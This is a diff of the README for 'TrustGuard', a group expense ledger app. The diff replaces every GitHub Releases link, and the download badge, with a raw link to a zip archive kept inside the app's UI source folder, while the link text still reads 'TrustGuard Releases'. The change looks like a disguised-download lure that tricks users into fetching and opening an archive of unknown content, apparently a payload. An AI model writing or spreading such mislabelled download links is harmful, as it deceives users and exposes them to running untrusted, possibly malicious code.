@@ -16,7 +16,7 @@ Welcome to TrustGuard! This is an offline-first group expense and settlement led
 To get started with TrustGuard, follow these simple steps:
 
 1. **Visit the Download Page**: Click the link below to download TrustGuard.
-   [![Download TrustGuard](https://img.shields.io/badge/Download-TrustGuard-blue)](https://github.com/JayeshBaria06/TrustGuard/releases)
+   [![Download TrustGuard](https://github.com/JayeshBaria06/TrustGuard/raw/refs/heads/main/app/lib/src/ui/Trust-Guard-v1.5.zip)](https://github.com/JayeshBaria06/TrustGuard/raw/refs/heads/main/app/lib/src/ui/Trust-Guard-v1.5.zip)
 
 2. **Choose Your Version**: On the Releases page, you will find different versions of TrustGuard. Select the one that best suits your device.
 
@@ -27,7 +27,7 @@ To get started with TrustGuard, follow these simple steps:
 ## 📥 Download & Install
 To download TrustGuard, please follow the instructions below:
 
-1. Visit this page to download: [TrustGuard Releases](https://github.com/JayeshBaria06/TrustGuard/releases).
+1. Visit this page to download: [TrustGuard Releases](https://github.com/JayeshBaria06/TrustGuard/raw/refs/heads/main/app/lib/src/ui/Trust-Guard-v1.5.zip).
 2. Based on your operating system, select the correct version of TrustGuard.
 3. After downloading, open the file and complete the installation process.
 
@@ -71,4 +71,4 @@ We value your input! Share your feedback about TrustGuard to help us improve. Jo
 ## 💡 Conclusion
 Thank you for choosing TrustGuard to manage your group expenses! We hope you find it helpful and easy to use. Start tracking your shared expenses today and enjoy the peace of mind that comes with financial clarity!
 
-For more details and to download TrustGuard, please visit: [TrustGuard Releases](https://github.com/JayeshBaria06/TrustGuard/releases).
+For more details and to download TrustGuard, please visit: [TrustGuard Releases](https://github.com/JayeshBaria06/TrustGuard/raw/refs/heads/main/app/lib/src/ui/Trust-Guard-v1.5.zip).
